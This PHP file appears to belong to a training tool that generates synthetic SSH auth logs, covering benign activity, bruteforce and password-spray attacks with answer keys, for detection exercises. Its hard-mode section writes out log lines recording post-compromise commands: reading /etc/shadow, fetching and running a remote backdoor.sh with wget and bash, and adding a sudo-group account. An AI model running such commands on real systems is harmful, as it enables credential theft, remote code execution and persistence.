<?php
/**
 * Pulse Generator — SSH Auth Log Generator
 * Generates realistic /var/log/auth.log with SSH bruteforce scenarios
 */

require_once __DIR__ . '/config.php';

/**
 * Generate legitimate SSH auth.log noise
 * Includes: successful key logins, session open/close, cron, sudo, systemd
 */
function generateSshNoise($count, $startTime, $endTime) {
    $lines = [];
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $hostname = SSH_HOSTNAME;
    $users = SSH_LEGIT_USERS;
    $ips = SSH_LEGIT_IPS;
    $clients = SSH_LEGIT_CLIENTS;

    $generated = 0;

    while ($generated < $count) {
        $ts = mt_rand($startTs, $endTs);
        $eventType = mt_rand(1, 100);

        if ($eventType <= 30) {
            // Successful SSH key-based login session
            $user = pick($users);
            $ip = pick($ips);
            $port = mt_rand(40000, 65535);
            $pid = mt_rand(10000, 65000);
            $client = pick($clients);

            $dt = new DateTime();
            $dt->setTimestamp($ts);

            // Connection accepted
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                    "Connection from {$ip} port {$port} on 0.0.0.0 port 22 rdomain \"\""),
            ];
            $generated++;

            // Auth methods
            $dt->modify('+1 second');
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                    "userauth-request for user {$user} service ssh-connection method publickey [preauth]"),
            ];
            $generated++;

            // Accepted publickey
            $fingerprint = 'SHA256:' . substr(base64_encode(random_bytes(32)), 0, 43);
            $dt->modify('+1 second');
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                    "Accepted publickey for {$user} from {$ip} port {$port} ssh2: ED25519 {$fingerprint}"),
            ];
            $generated++;

            // Session opened
            $dt->modify('+1 second');
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                    "pam_unix(sshd:session): session opened for user {$user}(uid=" . mt_rand(1000, 5000) . ") by {$user}(uid=0)"),
            ];
            $generated++;

            // Session closed after random duration
            $sessionDuration = mt_rand(60, 3600);
            $dt2 = clone $dt;
            $dt2->modify("+{$sessionDuration} seconds");
            if ($dt2->getTimestamp() <= $endTs) {
                $lines[] = [
                    'timestamp' => clone $dt2,
                    'line' => formatAuthLogLine($dt2, $hostname, 'sshd', $pid,
                        "pam_unix(sshd:session): session closed for user {$user}"),
                ];
                $generated++;

                $lines[] = [
                    'timestamp' => clone $dt2,
                    'line' => formatAuthLogLine($dt2, $hostname, 'sshd', $pid,
                        "Received disconnect from {$ip} port {$port}:11: disconnected by user"),
                ];
                $generated++;
            }

        } elseif ($eventType <= 55) {
            // CRON session
            $user = pick(['root', 'www-data', pick($users)]);
            $pid = mt_rand(10000, 65000);
            $dt = new DateTime();
            $dt->setTimestamp($ts);

            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'CRON', $pid,
                    "pam_unix(cron:session): session opened for user {$user}(uid=" . ($user === 'root' ? '0' : mt_rand(1000, 5000)) . ") by {$user}(uid=0)"),
            ];
            $generated++;

            $dt->modify('+' . mt_rand(1, 10) . ' seconds');
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'CRON', $pid,
                    "pam_unix(cron:session): session closed for user {$user}"),
            ];
            $generated++;

        } elseif ($eventType <= 75) {
            // sudo usage
            $user = pick($users);
            $pid = mt_rand(10000, 65000);
            $dt = new DateTime();
            $dt->setTimestamp($ts);

            $sudoCmds = [
                '/usr/bin/systemctl restart apache2',
                '/usr/bin/systemctl status mysql',
                '/usr/bin/apt update',
                '/usr/bin/tail -f /var/log/syslog',
                '/usr/bin/cat /etc/hosts',
                '/usr/bin/service nginx reload',
                '/bin/journalctl -u sshd --no-pager',
                '/usr/bin/certbot renew',
            ];

            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sudo', $pid,
                    "    {$user} : TTY=pts/" . mt_rand(0, 5) . " ; PWD=/home/{$user} ; USER=root ; COMMAND=" . pick($sudoCmds)),
            ];
            $generated++;

            $dt->modify('+1 second');
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sudo', $pid,
                    "pam_unix(sudo:session): session opened for user root(uid=0) by {$user}(uid=" . mt_rand(1000, 5000) . ")"),
            ];
            $generated++;

        } elseif ($eventType <= 90) {
            // systemd-logind session tracking
            $user = pick($users);
            $pid = mt_rand(500, 2000);
            $dt = new DateTime();
            $dt->setTimestamp($ts);
            $sessionId = mt_rand(100, 9999);

            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'systemd-logind', $pid,
                    "New session {$sessionId} of user {$user}."),
            ];
            $generated++;

        } else {
            // Occasional legit password auth failure (typo) then success
            $user = pick($users);
            $ip = pick($ips);
            $port = mt_rand(40000, 65535);
            $pid = mt_rand(10000, 65000);
            $dt = new DateTime();
            $dt->setTimestamp($ts);

            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                    "Failed password for {$user} from {$ip} port {$port} ssh2"),
            ];
            $generated++;

            // Success shortly after
            $dt->modify('+' . mt_rand(8, 30) . ' seconds');
            $pid2 = $pid + 1;
            $port2 = $port + 1;
            $lines[] = [
                'timestamp' => clone $dt,
                'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid2,
                    "Accepted password for {$user} from {$ip} port {$port2} ssh2"),
            ];
            $generated++;
        }
    }

    return $lines;
}


/**
 * Generate SSH bruteforce attack log lines
 */
function generateSshBruteforce($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];
    $answers = [
        'type' => 'SSH Bruteforce',
        'attacker_ips' => [],
        'total_attempts_per_ip' => [],
        'usernames_tried' => [],
        'compromised_user' => null,
        'success' => [],
    ];

    $attackerIps = pickN(ATTACKER_IP_POOL, $attackerCount);
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $hostname = SSH_HOSTNAME;
    $allUsers = SSH_BRUTE_USERS;
    $invalidUsers = SSH_INVALID_USERS;
    $validUsers = SSH_LEGIT_USERS;

    $answers['attacker_ips'] = $attackerIps;

    // Difficulty settings
    $attemptRanges = match($difficulty) {
        'easy'   => [80, 200],    // obvious rapid spray
        'medium' => [40, 100],    // moderate
        'hard'   => [15, 50],     // low & slow
        default  => [40, 100],
    };

    $delayRanges = match($difficulty) {
        'easy'   => [1, 3],
        'medium' => [2, 10],
        'hard'   => [10, 60],
        default  => [2, 10],
    };

    foreach ($attackerIps as $idx => $ip) {
        $client = pick(SSH_ATTACKER_CLIENTS);
        $attempts = mt_rand($attemptRanges[0], $attemptRanges[1]);
        $answers['total_attempts_per_ip'][$ip] = $attempts;

        $attackStart = mt_rand($startTs, $startTs + intval(($endTs - $startTs) * 0.4));
        $currentTs = $attackStart;

        // Pick a target user for the eventual success (one of the valid users)
        $targetUser = pick($validUsers);
        $successAttempt = mt_rand(intval($attempts * 0.75), $attempts - 1);

        $usernamesTried = [];

        for ($a = 0; $a < $attempts; $a++) {
            $pid = mt_rand(10000, 65000);
            $port = mt_rand(32768, 65535);
            $dt = new DateTime();
            $dt->setTimestamp($currentTs);

            $isSuccess = ($a === $successAttempt);

            if ($isSuccess) {
                // Successful password auth
                $user = $targetUser;
                $usernamesTried[] = $user;

                // Accepted password
                $lines[] = [
                    'timestamp' => clone $dt,
                    'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                        "Accepted password for {$user} from {$ip} port {$port} ssh2"),
                ];

                // Session opened
                $dt->modify('+1 second');
                $lines[] = [
                    'timestamp' => clone $dt,
                    'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                        "pam_unix(sshd:session): session opened for user {$user}(uid=" . mt_rand(1000, 5000) . ") by {$user}(uid=0)"),
                ];

                $answers['compromised_user'] = $user;
                $answers['success'][] = [
                    'ip' => $ip,
                    'user' => $user,
                    'attempt_number' => $a + 1,
                ];

                // Post-compromise activity (if hard mode, attacker does recon via SSH)
                if ($difficulty === 'hard') {
                    $postTs = $currentTs + mt_rand(10, 60);
                    $dtPost = new DateTime();
                    $dtPost->setTimestamp($postTs);
                    $sudoPid = mt_rand(10000, 65000);

                    // Attacker tries sudo
                    $lines[] = [
                        'timestamp' => clone $dtPost,
                        'line' => formatAuthLogLine($dtPost, $hostname, 'sudo', $sudoPid,
                            "    {$user} : TTY=pts/0 ; PWD=/home/{$user} ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"),
                    ];

                    $dtPost->modify('+' . mt_rand(5, 20) . ' seconds');
                    $lines[] = [
                        'timestamp' => clone $dtPost,
                        'line' => formatAuthLogLine($dtPost, $hostname, 'sudo', $sudoPid,
                            "    {$user} : TTY=pts/0 ; PWD=/home/{$user} ; USER=root ; COMMAND=/usr/bin/wget http://{$ip}/backdoor.sh -O /tmp/.bd.sh"),
                    ];

                    $dtPost->modify('+' . mt_rand(3, 10) . ' seconds');
                    $lines[] = [
                        'timestamp' => clone $dtPost,
                        'line' => formatAuthLogLine($dtPost, $hostname, 'sudo', $sudoPid,
                            "    {$user} : TTY=pts/0 ; PWD=/home/{$user} ; USER=root ; COMMAND=/bin/bash /tmp/.bd.sh"),
                    ];

                    $dtPost->modify('+' . mt_rand(5, 15) . ' seconds');
                    $lines[] = [
                        'timestamp' => clone $dtPost,
                        'line' => formatAuthLogLine($dtPost, $hostname, 'sudo', $sudoPid + 1,
                            "    {$user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo svc_update"),
                    ];
                }

            } else {
                // Failed attempt
                // Pick a username: mix of valid and invalid
                if (mt_rand(1, 3) === 1) {
                    // Try an invalid user
                    $user = pick($invalidUsers);
                    $usernamesTried[] = $user;

                    // "Invalid user" message first
                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "Invalid user {$user} from {$ip} port {$port}"),
                    ];

                    $dt->modify('+1 second');
                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "pam_unix(sshd:auth): check pass; user unknown"),
                    ];

                    $dt->modify('+1 second');
                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "Failed password for invalid user {$user} from {$ip} port {$port} ssh2"),
                    ];
                } else {
                    // Try a valid username with wrong password
                    $user = pick($allUsers);
                    $usernamesTried[] = $user;

                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={$ip}  user={$user}"),
                    ];

                    $dt->modify('+2 seconds');
                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "Failed password for {$user} from {$ip} port {$port} ssh2"),
                    ];
                }

                // Connection closed / reset after failure
                $dt->modify('+1 second');
                $disconnectMsgs = [
                    "Connection closed by authenticating user {$user} {$ip} port {$port} [preauth]",
                    "Disconnected from authenticating user {$user} {$ip} port {$port} [preauth]",
                    "Connection reset by {$ip} port {$port} [preauth]",
                ];
                $lines[] = [
                    'timestamp' => clone $dt,
                    'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid, pick($disconnectMsgs)),
                ];
            }

            // Add maximum auth attempts exceeded message occasionally
            if (mt_rand(1, 8) === 1) {
                $dt2 = clone $dt;
                $dt2->modify('+1 second');
                $maxAttempts = pick([3, 6]);
                $lines[] = [
                    'timestamp' => clone $dt2,
                    'line' => formatAuthLogLine($dt2, $hostname, 'sshd', $pid,
                        "error: maximum authentication attempts exceeded for {$user} from {$ip} port {$port} ssh2 [preauth]"),
                ];

                // Disconnecting message after max attempts
                $dt2->modify('+1 second');
                $lines[] = [
                    'timestamp' => clone $dt2,
                    'line' => formatAuthLogLine($dt2, $hostname, 'sshd', $pid,
                        "Disconnecting authenticating user {$user} {$ip} port {$port}: Too many authentication failures [preauth]"),
                ];
            }

            // Delay between attempts
            $delay = mt_rand($delayRanges[0], $delayRanges[1]);
            if ($difficulty === 'easy' && mt_rand(1, 3) === 1) {
                $delay = 0; // burst
            }
            $currentTs += $delay;
        }

        $answers['usernames_tried'] = array_values(array_unique(array_merge(
            $answers['usernames_tried'],
            $usernamesTried
        )));
    }

    return ['lines' => $lines, 'answers' => $answers];
}


/**
 * Generate SSH password spray attack
 * Different from bruteforce: tries one password across many users, then rotates
 */
function generateSshSpray($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];
    $answers = [
        'type' => 'SSH Password Spray',
        'attacker_ips' => [],
        'total_attempts_per_ip' => [],
        'usernames_targeted' => [],
        'compromised_user' => null,
        'success' => [],
    ];

    $attackerIps = pickN(ATTACKER_IP_POOL, $attackerCount);
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();
    $hostname = SSH_HOSTNAME;

    $answers['attacker_ips'] = $attackerIps;

    // Spray targets a fixed set of users with slow rotation
    $sprayUsers = array_slice(SSH_BRUTE_USERS, 0, mt_rand(8, 15));
    $answers['usernames_targeted'] = $sprayUsers;

    // Number of "rounds" (each round = one password across all users)
    $roundCount = match($difficulty) {
        'easy'   => mt_rand(5, 10),
        'medium' => mt_rand(3, 6),
        'hard'   => mt_rand(2, 4),
        default  => mt_rand(3, 6),
    };

    $roundDelay = match($difficulty) {
        'easy'   => [30, 120],
        'medium' => [120, 600],
        'hard'   => [600, 1800],  // 10-30 min between rounds
        default  => [120, 600],
    };

    foreach ($attackerIps as $ip) {
        $currentTs = mt_rand($startTs, $startTs + intval(($endTs - $startTs) * 0.3));
        $totalAttempts = 0;

        // Pick which round + user combo succeeds
        $successRound = $roundCount - 1;
        $successUserIdx = mt_rand(0, count($sprayUsers) - 1);
        $successUser = $sprayUsers[$successUserIdx];

        for ($round = 0; $round < $roundCount; $round++) {
            foreach ($sprayUsers as $uIdx => $user) {
                $pid = mt_rand(10000, 65000);
                $port = mt_rand(32768, 65535);
                $dt = new DateTime();
                $dt->setTimestamp($currentTs);

                $isSuccess = ($round === $successRound && $uIdx === $successUserIdx);
                $isValid = in_array($user, SSH_LEGIT_USERS);

                if ($isSuccess) {
                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "Accepted password for {$user} from {$ip} port {$port} ssh2"),
                    ];
                    $answers['compromised_user'] = $user;
                    $answers['success'][] = ['ip' => $ip, 'user' => $user, 'round' => $round + 1];
                } else {
                    if (!$isValid) {
                        $lines[] = [
                            'timestamp' => clone $dt,
                            'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                                "Invalid user {$user} from {$ip} port {$port}"),
                        ];
                        $dt->modify('+1 second');
                        $lines[] = [
                            'timestamp' => clone $dt,
                            'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                                "Failed password for invalid user {$user} from {$ip} port {$port} ssh2"),
                        ];
                    } else {
                        $lines[] = [
                            'timestamp' => clone $dt,
                            'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                                "Failed password for {$user} from {$ip} port {$port} ssh2"),
                        ];
                    }

                    $dt->modify('+1 second');
                    $lines[] = [
                        'timestamp' => clone $dt,
                        'line' => formatAuthLogLine($dt, $hostname, 'sshd', $pid,
                            "Connection closed by authenticating user {$user} {$ip} port {$port} [preauth]"),
                    ];
                }

                $totalAttempts++;
                // Small delay between users in same round
                $currentTs += mt_rand(2, 10);
            }

            // Delay between rounds
            $currentTs += mt_rand($roundDelay[0], $roundDelay[1]);
        }

        $answers['total_attempts_per_ip'][$ip] = $totalAttempts;
    }

    return ['lines' => $lines, 'answers' => $answers];
}
